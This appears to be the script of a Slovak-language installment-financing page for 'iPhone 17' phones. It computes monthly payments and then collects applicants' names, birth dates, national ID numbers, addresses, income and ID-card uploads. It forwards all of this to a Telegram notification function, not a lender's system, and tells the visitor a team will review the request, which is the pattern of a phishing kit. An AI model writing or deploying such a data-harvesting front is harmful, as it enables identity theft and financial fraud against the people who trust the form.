document.addEventListener('DOMContentLoaded', () => {
    // Set language for this page
    window.currentLanguage = 'sk';
    updateLanguage('sk');

    // Form Elements
    const productSelect = document.getElementById('product-select');
    const storageGroup = document.getElementById('storage-group');
    const storageSelect = document.getElementById('storage-select');
    const colorGroup = document.getElementById('color-group');
    const colorSelect = document.getElementById('color-select');
    const monthsGroup = document.getElementById('months-group');
    const monthsSelect = document.getElementById('months-select');
    const summaryPrice = document.getElementById('summary-price');
    const summaryMonthly = document.getElementById('summary-monthly');
    const summary = document.getElementById('calculation-summary');
    const submitBtn = document.getElementById('submit-application-btn');
    const termsSection = document.getElementById('terms-section');
    const customerInfoSection = document.getElementById('customer-info-section');
    const customerInfoForm = document.getElementById('customer-info-form');
    const termsCheckbox = document.getElementById('terms-agree-checkbox');
    const employmentStatusSelect = document.getElementById('employment-status');
    const employerGroup = document.getElementById('employer-group');

    let basePrice = 0;
    let monthlyPayment = 0;
    let selectedProduct = null;
    let selectedVariant = null;
    let selectedColor = null;

    function populateMonths() {
        if (!monthsSelect) return;
        monthsSelect.innerHTML = ''; // Clear existing
        const plans = [
            { months: 6, interest: 2 },
            { months: 12, interest: 4 },
            { months: 18, interest: 5 },
            { months: 24, interest: 6 }
        ];
        plans.forEach(plan => {
            const option = document.createElement('option');
            option.value = plan.months;
            let text = t('split_payment_month_interest').replace('{months}', plan.months).replace('{interest}', plan.interest);
            option.textContent = text;
            option.dataset.interest = plan.interest;
            monthsSelect.appendChild(option);
        });
    }

    // 1. Populate Product Dropdown
    if (typeof productsForSplitPaymentIphone17 !== 'undefined') {
        productsForSplitPaymentIphone17.forEach(product => {
            const option = document.createElement('option');
            option.value = product.id;
            option.textContent = product.name;
            productSelect.appendChild(option);
        });
    }

    populateMonths();

    // 2. Event Listeners
    productSelect.addEventListener('change', () => {
        const productId = productSelect.value;
        selectedProduct = productsForSplitPaymentIphone17.find(p => p.id === productId);
        resetSelections(1);

        if (selectedProduct) {
            storageSelect.innerHTML = `<option value="">${t('split_payment_choose_storage')}</option>`;
            selectedProduct.variants.forEach(variant => {
                const option = document.createElement('option');
                option.value = variant.storage;
                option.textContent = `${variant.storage} - ${convertPrice(variant.price, false)}`;
                option.dataset.price = variant.price;
                storageSelect.appendChild(option);
            });
            storageGroup.style.display = 'block';
        }
    });

    storageSelect.addEventListener('change', () => {
        const selectedOption = storageSelect.options[storageSelect.selectedIndex];
        resetSelections(2);
        if (selectedOption.value) {
            selectedVariant = {
                storage: selectedOption.value,
                price: parseFloat(selectedOption.dataset.price)
            };
            colorSelect.innerHTML = `<option value="">${t('split_payment_choose_color')}</option>`;
            selectedProduct.colors.forEach(color => {
                const option = document.createElement('option');
                option.value = color;
                option.textContent = color;
                colorSelect.appendChild(option);
            });
            colorGroup.style.display = 'block';
        }
    });

    colorSelect.addEventListener('change', () => {
        selectedColor = colorSelect.value;
        resetSelections(3);
        if (selectedColor) {
            monthsGroup.style.display = 'block';
            updateCalculations();
        }
    });

    monthsSelect.addEventListener('change', updateCalculations);

    employmentStatusSelect.addEventListener('change', () => {
        if (employmentStatusSelect.value === 'employed' || employmentStatusSelect.value === 'self-employed') {
            employerGroup.style.display = 'block';
            document.getElementById('employer-name').required = true;
        } else {
            employerGroup.style.display = 'none';
            document.getElementById('employer-name').required = false;
        }
    });

    customerInfoForm.addEventListener('input', checkFormCompletion);
    termsCheckbox.addEventListener('change', checkFormCompletion);

    function resetSelections(level) {
        if (level <= 1) {
            storageGroup.style.display = 'none';
            selectedVariant = null;
        }
        if (level <= 2) {
            colorGroup.style.display = 'none';
            selectedColor = null;
        }
        if (level <= 3) {
            monthsGroup.style.display = 'none';
            summary.style.display = 'none';
            customerInfoSection.style.display = 'none';
            termsSection.style.display = 'none';
            submitBtn.disabled = true;
        }
    }

    function updateCalculations() {
        if (!selectedVariant || !selectedColor) return;
        summary.style.display = 'block';

        const basePrice = selectedVariant.price;
        const selectedMonthOption = monthsSelect.options[monthsSelect.selectedIndex];
        const months = parseInt(selectedMonthOption.value);
        const interestRate = parseFloat(selectedMonthOption.dataset.interest);
        
        const interestAmount = basePrice * (interestRate / 100);
        const totalPrice = basePrice + interestAmount;
        const monthlyPayment = totalPrice / months;
        const monthlyText = t('split_payment_monthly_value');

        document.getElementById('summary-price').textContent = convertPrice(basePrice, false);
        document.getElementById('summary-interest-rate').textContent = interestRate;
        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount, false);
        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice, false);
        document.getElementById('summary-monthly').textContent = monthlyText
            .replace('{price}', convertPrice(monthlyPayment, false))
            .replace('{months}', months) + " €";
        console.log('basePrice', basePrice);
        console.log('monthlyPayment', monthlyPayment);

        summary.style.display = 'block';
        customerInfoSection.style.display = 'block';
        checkFormCompletion();
    }

    function validateCustomerInfo() {
        const requiredFields = ['customer-name', 'customer-dob', 'customer-email', 'customer-phone', 'customer-national-id', 'customer-address', 'employment-status', 'monthly-income', 'id-upload-front', 'id-upload-back'];
        for (const fieldId of requiredFields) {
            const field = document.getElementById(fieldId);
            if (!field.value) return false;
        }
        if (document.getElementById('employer-name').required && !document.getElementById('employer-name').value) {
            return false;
        }
        return true;
    }

    function checkFormCompletion() {
        if (validateCustomerInfo()) {
            termsSection.style.display = 'block';
            submitBtn.disabled = !termsCheckbox.checked;
        } else {
            termsSection.style.display = 'none';
            submitBtn.disabled = true;
        }
    }

    submitBtn.addEventListener('click', () => {
        if (!selectedProduct || !selectedVariant || !selectedColor || !validateCustomerInfo() || !termsCheckbox.checked) {
            alert("Prosím, vyplňte všetky povinné polia a súhlaste s podmienkami.");
            return;
        }

        const customerData = {
            name: document.getElementById('customer-name').value,
            dob: document.getElementById('customer-dob').value,
            email: document.getElementById('customer-email').value,
            phone: document.getElementById('customer-phone').value,
            nationalId: document.getElementById('customer-national-id').value,
            address: document.getElementById('customer-address').value,
            employment: document.getElementById('employment-status').options[document.getElementById('employment-status').selectedIndex].text,
            employer: document.getElementById('employer-name').value || 'N/A',
            income: document.getElementById('monthly-income').value,
            idFront: document.getElementById('id-upload-front').files[0]?.name || 'Not provided',
            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided',
            addressProof: document.getElementById('address-proof-upload').files[0]?.name || 'Not provided'
        };

        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
            TelegramNotifications.splitPaymentApplicationSubmitted({
                productName: `${selectedProduct.name} (${selectedVariant.storage} - ${selectedColor})`,
                total: document.getElementById('summary-total-price').textContent,
                monthly: document.getElementById('summary-monthly').textContent,
                months: monthsSelect.value,
                customer: customerData
            });
        }

        // Show success message to user
        document.querySelector('.split-payment-calculator').innerHTML = `
            <div style="text-align: center; padding: 2rem;">
                <i class="fas fa-check-circle" style="font-size: 4rem; color: #28a745; margin-bottom: 1rem;"></i>
                <h2 style="color: #333;">Ďakujeme za Vašu žiadosť!</h2>
                <p style="color: #555; font-size: 1.1rem;">Vaša žiadosť o financovanie bola úspešne odoslaná. Náš tím ju teraz posúdi a čo najskôr sa vám ozveme s výsledkom.</p>
                <a href="index.html" class="btn btn-primary" style="margin-top: 2rem;">Späť na hlavnú stránku</a>
            </div>
        `;
    });
});
